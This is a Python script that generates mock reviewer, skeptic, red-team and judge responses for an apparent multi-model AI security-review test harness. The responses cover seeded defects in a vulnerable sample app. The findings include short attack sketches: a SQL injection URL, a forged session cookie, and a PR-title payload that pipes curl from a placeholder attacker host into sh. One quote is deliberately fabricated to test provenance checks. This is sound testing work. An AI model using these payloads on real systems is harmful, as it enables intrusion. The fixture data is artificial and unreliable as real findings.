"""Generate fixtures/mock-responses/*.json from the seeded defects in fixtures/vuln-sample.

Line numbers are looked up from the fixture files so the provenance check passes for real
and fails for the one deliberately fabricated quote. Re-run after editing the fixture app.
"""

from __future__ import annotations

import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SAMPLE = ROOT / "fixtures" / "vuln-sample"
OUT = ROOT / "fixtures" / "mock-responses"

V = {
    "sqli": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
    "xss": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
    "idor": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
    "secret": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
    "ci": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
    "medium": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
    "low": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
    "high": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
}


def loc(file: str, needle: str) -> tuple[str, int, str]:
    lines = (SAMPLE / file).read_text(encoding="utf-8").splitlines()
    for i, line in enumerate(lines, 1):
        if needle in line:
            return file, i, line.strip()[:200]
    raise SystemExit(f"needle not found: {file}: {needle}")


def F(title, cwe, refs, file, needle, vec, reach="reachable", arg="", sketch="", conf=0.8, fake=False):
    f, ln, quote = loc(file, needle)
    if fake:
        quote = "cur.execute(\"SELECT name FROM users WHERE id = '\" + user_id + \"'\")"  # does not exist in file
    return {
        "title": title, "cwe": cwe, "standard_refs": refs,
        "provenance": [{"file": f, "line": ln, "quote": quote}],
        "reachability": reach, "reachability_argument": arg or "Handler is a public Flask route reachable without authentication.",
        "exploit_sketch": sketch or "Attacker supplies crafted input to the public endpoint.",
        "cvss4_vector": vec, "model_confidence": conf,
    }


A, D, N = "anthropic", "deepseek", "nemotron"

SEED = {
  "architecture": {
    A: [F("Authorization decided by a client-controlled X-Admin header", "CWE-285", ["ASVS 5.0 V8.2", "OWASP A01:2025"], "app.py", 'X-Admin', V["high"], sketch="Send X-Admin: 1 to /admin/export to obtain the export token."),
        F("Placeholder logic: sanitisation deferred with a TODO on a live path", "CWE-693", ["ASVS 5.0 V15.3", "OWASP A06:2025"], "app.py", "TODO: sanitize", V["medium"], reach="conditional")],
    D: [F("Admin function gated only by a request header", "CWE-285", ["ASVS 5.0 V8.3", "OWASP A01:2025", "ASVS 5.0 V1"], "app.py", 'X-Admin', V["high"])],
    N: [F("Header-based admin check instead of server-side role", "CWE-285", ["ASVS 5.0 V8.2", "ASVS 5.0 V17.1", "OWASP A11:2025"], "app.py", 'X-Admin', V["high"], conf=0.7)],
  },
  "vulnerabilities": {
    A: [F("SQL injection via string concatenation of order_id", "CWE-89", ["OWASP A05:2025", "ASVS 5.0 V1.2"], "app.py", "SELECT * FROM orders WHERE id = ", V["sqli"], sketch="GET /orders/1%20OR%201=1 returns arbitrary rows."),
        F("Open redirect through unvalidated next parameter after login", "CWE-601", ["ASVS 5.0 V3.5"], "app.py", 'redirect(request.args.get("next"', V["low"], reach="conditional", conf=0.55),
        F("SQL injection in profile query", "CWE-89", ["OWASP A05:2025"], "app.py", "address FROM users", V["sqli"], conf=0.6, fake=True)],
    D: [F("SQL injection: order_id concatenated into query", "CWE-89", ["OWASP A05:2025", "ASVS 5.0 V1.2"], "app.py", "SELECT * FROM orders WHERE id = ", V["sqli"]),
        F("Open redirect via next parameter", "CWE-601", ["ASVS 5.0 V3.5"], "app.py", 'redirect(request.args.get("next"', V["low"], reach="conditional", conf=0.5)],
    N: [F("Unparameterised SQL built from path parameter", "CWE-89", ["OWASP A05:2025"], "app.py", "SELECT * FROM orders WHERE id = ", V["sqli"])],
  },
  "xss": {
    A: [F("Reflected XSS: query parameter concatenated into a template string", "CWE-79", ["OWASP A05:2025", "ASVS 5.0 V1.2"], "app.py", "Results for", V["xss"], sketch="/search?q=<script>… executes in victim browser."),
        F("DOM XSS: URL parameter assigned to innerHTML", "CWE-79", ["ASVS 5.0 V3.2"], "static/index.html", "innerHTML", V["xss"])],
    D: [F("Reflected XSS in /search via render_template_string concatenation", "CWE-79", ["OWASP A05:2025"], "app.py", "Results for", V["xss"]),
        F("eval() on server-supplied JSON field enables script injection", "CWE-95", ["ASVS 5.0 V3.2"], "static/index.html", "eval(o.render)", V["high"], reach="conditional")],
    N: [F("Reflected XSS from q parameter", "CWE-79", ["OWASP A05:2025"], "app.py", "Results for", V["xss"]),
        F("innerHTML sink fed from location.search", "CWE-79", ["ASVS 5.0 V3.2"], "static/index.html", "innerHTML", V["xss"])],
  },
  "csp": {
    A: [F("No Content-Security-Policy on HTML responses", "CWE-1021", ["ASVS 5.0 V3.4"], "static/index.html", "<!doctype html>", V["low"], reach="conditional", arg="No CSP header set anywhere in app.py and no meta tag in the page; inline script and eval present."),
        F("Script loaded from a CDN that hosts AngularJS (CSP allowlist gadget)", "CWE-829", ["ASVS 5.0 V3.6"], "static/index.html", "angular.min.js", V["medium"], reach="conditional")],
    D: [],
    N: [F("Missing CSP; inline script and eval() would be blocked by a strict policy", "CWE-1021", ["ASVS 5.0 V3.4"], "static/index.html", "<!doctype html>", V["low"], reach="conditional")],
  },
  "authn_authz": {
    A: [F("IDOR: any user can read any profile by id (BOLA)", "CWE-639", ["OWASP API1:2023", "OWASP A01:2025", "ASVS 5.0 V8.2"], "app.py", "address FROM users", V["idor"], reach="conditional", arg="Route takes user_id from the path and performs no ownership check; requires any valid session."),
        F("Session cookie is the plain username, forgeable by the client", "CWE-565", ["ASVS 5.0 V7.2"], "app.py", 'set_cookie("session"', V["high"], sketch="Set Cookie: session=admin.")],
    D: [F("Broken object level authorization on /api/users/<id>/profile", "CWE-639", ["OWASP API1:2023"], "app.py", "address FROM users", V["idor"], reach="conditional"),
        F("Predictable, unsigned session cookie derived from username", "CWE-565", ["ASVS 5.0 V7.2"], "app.py", 'set_cookie("session"', V["high"])],
    N: [F("Profile endpoint lacks per-object authorization", "CWE-639", ["OWASP API1:2023"], "app.py", "address FROM users", V["idor"], reach="conditional"),
        F("Passwords compared in plaintext in SQL (no hashing)", "CWE-916", ["ASVS 5.0 V6.2", "OWASP A07:2025"], "app.py", "AND password = ?", V["high"], reach="conditional")],
  },
  "dependencies": {
    A: [F("requests pinned to 2.19.0 (2018), many known advisories; scanner must confirm", "CWE-1395", ["OWASP A03:2025", "ASVS 5.0 V15.2"], "requirements.txt", "requests==", V["high"], reach="conditional"),
        F("Suspicious package name flask-secure-auth-helper (possible hallucinated/typosquat)", "CWE-829", ["OWASP A03:2025"], "requirements.txt", "flask-secure", V["ci"], reach="conditional", conf=0.6)],
    D: [F("Outdated requests==2.19.0", "CWE-1395", ["OWASP A03:2025"], "requirements.txt", "requests==", V["high"], reach="conditional"),
        F("Unknown package flask-secure-auth-helper; verify it exists on PyPI", "CWE-829", ["OWASP A03:2025"], "requirements.txt", "flask-secure", V["ci"], reach="conditional", conf=0.65)],
    N: [F("flask unpinned; no lockfile", "CWE-1104", ["ASVS 5.0 V15.2"], "requirements.txt", "flask", V["low"], reach="unknown", conf=0.4)],
  },
  "github_actions": {
    A: [F("Pwn request: pull_request_target checks out the PR head with write-all permissions", "CWE-829", ["OWASP A03:2025"], ".github/workflows/deploy.yml", "head.sha", V["ci"], sketch="Fork PR modifies build files; workflow runs them with repository secrets."),
        F("Script injection: PR title interpolated into run step", "CWE-78", ["OWASP A05:2025"], ".github/workflows/deploy.yml", "pull_request.title", V["ci"], sketch='PR title `"; curl attacker | sh #` executes on the runner.'),
        F("Third-party action pinned to a mutable branch (@main) not a commit SHA", "CWE-1357", ["OWASP A03:2025"], ".github/workflows/deploy.yml", "deploy-action@main", V["high"], reach="conditional")],
    D: [F("pull_request_target with explicit checkout of untrusted head", "CWE-829", ["OWASP A03:2025"], ".github/workflows/deploy.yml", "head.sha", V["ci"]),
        F("Untrusted github.event.pull_request.title used in shell", "CWE-78", ["OWASP A05:2025"], ".github/workflows/deploy.yml", "pull_request.title", V["ci"])],
    N: [F("Checkout of PR head under pull_request_target", "CWE-829", ["OWASP A03:2025"], ".github/workflows/deploy.yml", "head.sha", V["ci"]),
        F("permissions: write-all grants the token every scope", "CWE-250", ["OWASP A01:2025"], ".github/workflows/deploy.yml", "write-all", V["high"], reach="conditional"),
        F("Action reference @main is mutable", "CWE-1357", ["OWASP A03:2025"], ".github/workflows/deploy.yml", "deploy-action@main", V["high"], reach="conditional")],
  },
  "secrets": {
    A: [F("GitHub token hard-coded in config.py", "CWE-798", ["ASVS 5.0 V13.3", "OWASP A02:2025"], "config.py", "ghp_", V["secret"]),
        F("AWS credentials stored in cleartext in source", "CWE-312", ["ASVS 5.0 V13.3"], "config.py", "AKIA", V["secret"]),
        F("Password written to application log", "CWE-532", ["ASVS 5.0 V16.2", "OWASP A09:2025"], "app.py", "password=%s", V["high"], reach="conditional")],
    D: [F("Hard-coded GitHub personal access token", "CWE-798", ["ASVS 5.0 V13.3"], "config.py", "ghp_", V["secret"]),
        F("AWS access key and secret committed", "CWE-312", ["ASVS 5.0 V13.3"], "config.py", "AKIA", V["secret"]),
        F("Login handler logs the cleartext password", "CWE-532", ["ASVS 5.0 V16.2"], "app.py", "password=%s", V["high"], reach="conditional")],
    N: [F("ghp_ token in source", "CWE-798", ["ASVS 5.0 V13.3"], "config.py", "ghp_", V["secret"]),
        F("Cleartext password in log line", "CWE-532", ["ASVS 5.0 V16.2"], "app.py", "password=%s", V["high"], reach="conditional")],
  },
  "input_validation": {
    A: [F("order_id path parameter used without type or range validation", "CWE-20", ["ASVS 5.0 V2.2"], "app.py", "def get_order(order_id)", V["medium"]),
        F("README contains an instruction aimed at automated reviewers (prompt injection)", "CWE-1427", ["OWASP LLM01:2025"], "README.md", "reviewer note", V["low"], reach="conditional", conf=0.7)],
    D: [F("Unvalidated order_id flows into SQL", "CWE-20", ["ASVS 5.0 V2.2"], "app.py", "def get_order(order_id)", V["medium"]),
        F("Hidden reviewer instruction in README (indirect prompt injection)", "CWE-1427", ["OWASP LLM01:2025"], "README.md", "reviewer note", V["low"], reach="conditional")],
    N: [F("No validation of order_id", "CWE-20", ["ASVS 5.0 V2.2"], "app.py", "def get_order(order_id)", V["medium"])],
  },
  "error_handling": {
    A: [F("Global error handler returns full traceback to the client", "CWE-209", ["OWASP A10:2025", "ASVS 5.0 V16.5"], "app.py", "traceback.format_exc()", V["medium"]),
        F("Login error distinguishes nothing but debug=True leaks internals", "CWE-215", ["OWASP A10:2025", "ASVS 5.0 V16.5"], "app.py", "debug=True", V["medium"])],
    D: [F("Stack trace disclosure in errorhandler", "CWE-209", ["OWASP A10:2025"], "app.py", "traceback.format_exc()", V["medium"]),
        F("Flask debug mode enabled on 0.0.0.0 (Werkzeug debugger allows code execution)", "CWE-215", ["OWASP A10:2025"], "app.py", "debug=True", V["sqli"], reach="conditional")],
    N: [],
  },
  "supply_chain": {
    A: [F("curl | sh installer without checksum or signature", "CWE-494", ["OWASP A08:2025", "OWASP A03:2025"], "Dockerfile", "install.sh | sh", V["ci"], reach="conditional"),
        F("Mutable base image tag python:latest", "CWE-1104", ["OWASP A03:2025"], "Dockerfile", "python:latest", V["medium"], reach="conditional")],
    D: [F("Remote install script piped to shell", "CWE-494", ["OWASP A08:2025"], "Dockerfile", "install.sh | sh", V["ci"], reach="conditional"),
        F("Third-party script from CDN without Subresource Integrity", "CWE-829", ["ASVS 5.0 V3.6", "OWASP A08:2025"], "static/index.html", "angular.min.js", V["medium"], reach="conditional")],
    N: [F("Unverified curl | sh in Dockerfile", "CWE-494", ["OWASP A08:2025"], "Dockerfile", "install.sh | sh", V["ci"], reach="conditional"),
        F("FROM python:latest is not reproducible", "CWE-1104", ["OWASP A03:2025"], "Dockerfile", "python:latest", V["medium"], reach="conditional")],
  },
}

SKEPTIC = {
    "default": {"verdict": "stands", "reason": "Searched for sanitizers, decorators and middleware on this path; none found.", "sanitizer_or_control": ""},
    "by_claim": {
        "profile query": {"verdict": "refuted", "reason": "The profile query uses a parameterised placeholder (?, (user_id,)); no concatenation exists at the cited line.", "sanitizer_or_control": "app.py:41 parameterised sqlite3 query"},
        "open redirect": {"verdict": "weakened", "reason": "Flask redirect accepts absolute URLs, but the value only reaches redirect after a successful login; impact limited to phishing.", "sanitizer_or_control": ""},
        "flask unpinned": {"verdict": "weakened", "reason": "Unpinned but no known vulnerable range can be asserted without a scanner.", "sanitizer_or_control": ""},
    },
}
REDTEAM = {
    "default": {"exploitable": "yes", "preconditions": "Network access to the application; no account needed."},
    "by_claim": {
        "IDOR": {"exploitable": "conditional", "preconditions": "Any valid session cookie; ids are sequential integers."},
        "object level": {"exploitable": "conditional", "preconditions": "Any valid session cookie."},
        "per-object": {"exploitable": "conditional", "preconditions": "Any valid session cookie."},
        "open redirect": {"exploitable": "conditional", "preconditions": "Victim must log in through an attacker-supplied link."},
        "requests": {"exploitable": "unknown", "preconditions": "Depends on which requests APIs are used; scanner confirmation required."},
        "flask unpinned": {"exploitable": "unknown", "preconditions": "None demonstrable."},
        "pull_request_target": {"exploitable": "yes", "preconditions": "Ability to open a pull request from a fork."},
        "Pwn request": {"exploitable": "yes", "preconditions": "Ability to open a pull request from a fork."},
        "title": {"exploitable": "yes", "preconditions": "Ability to open a pull request with a crafted title."},
        "traceback": {"exploitable": "yes", "preconditions": "Trigger any unhandled exception, e.g. malformed order id."},
    },
}
JUDGE_COMMON_BANDS = {
    "SQL injection": "Critical", "Unparameterised SQL": "Critical", "token": "Critical", "AWS": "Critical",
    "Pwn": "Critical", "pull_request_target": "Critical", "Checkout of PR": "Critical", "title": "High", "Untrusted github": "High",
    "XSS": "Medium", "innerHTML": "Medium", "eval": "High", "traceback": "Medium", "Stack trace": "Medium",
    "log": "Medium", "Content-Security-Policy": "Low", "CSP": "Low", "AngularJS": "Low", "curl": "High", "install script": "High",
    "latest": "Low", "order_id": "Medium", "README": "Low", "prompt injection": "Low", "IDOR": "High", "object level": "High",
    "per-object": "High", "cookie": "High", "Passwords compared": "High", "requests": "High", "flask-secure": "Medium",
    "Unknown package": "Medium", "X-Admin": "High", "admin": "High", "Header-based": "High", "Placeholder": "Low",
    "@main": "Medium", "mutable": "Medium", "write-all": "Medium", "debug": "High", "Subresource": "Medium",
}


def judge_rules(family: str) -> dict:
    by_claim = {k: {"verdict": "true_positive", "severity_band": v, "reason": "Quoted code supports the claim; skeptic found no control."} for k, v in JUDGE_COMMON_BANDS.items()}
    by_claim["profile query"] = {"verdict": "false_positive", "severity_band": "None", "reason": "Cited line uses a parameterised query; the quote does not appear in the file."}
    if family == A:
        by_claim["Open redirect"] = {"verdict": "needs_human", "severity_band": "Low", "reason": "Redirect target is unvalidated, but exploitation needs a successful login; impact unclear."}
        by_claim["flask unpinned"] = {"verdict": "false_positive", "severity_band": "None", "reason": "No vulnerable range demonstrated; hygiene, not a vulnerability."}
    if family == D:
        by_claim["Open redirect"] = {"verdict": "true_positive", "severity_band": "Low", "reason": "Unvalidated redirect target."}
        by_claim["flask unpinned"] = {"verdict": "needs_human", "severity_band": "Low", "reason": "Needs scanner confirmation."}
    if family == N:
        by_claim["Open redirect"] = {"verdict": "false_positive", "severity_band": "None", "reason": "Requires login and only redirects post-auth; policy excludes open redirects without proven impact."}
        by_claim["flask unpinned"] = {"verdict": "needs_human", "severity_band": "Low", "reason": "Hygiene issue."}
    data = {"default": {"verdict": "needs_human", "severity_band": "Medium", "reason": "Evidence insufficient to decide."}, "by_claim": by_claim}
    if family == D:
        data["flip_on_reverse"] = ["Open redirect"]  # simulated position bias
    return data


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    for old in OUT.glob("*.json"):
        old.unlink()
    for dim, fams in SEED.items():
        for fam, findings in fams.items():
            (OUT / f"reviewer_{dim}_{fam}.json").write_text(json.dumps({"findings": findings}, indent=1, ensure_ascii=False), encoding="utf-8")
    (OUT / f"reviewer_error_handling_{N}.json").write_text(json.dumps({"_refuse": True}), encoding="utf-8")
    for fam in (A, D, N):
        (OUT / f"skeptic_{fam}.json").write_text(json.dumps(SKEPTIC, indent=1), encoding="utf-8")
        (OUT / f"redteam_{fam}.json").write_text(json.dumps(REDTEAM, indent=1), encoding="utf-8")
        (OUT / f"judge_{fam}.json").write_text(json.dumps(judge_rules(fam), indent=1), encoding="utf-8")
    print(f"wrote {len(list(OUT.glob('*.json')))} fixture files to {OUT}")


if __name__ == "__main__":
    main()
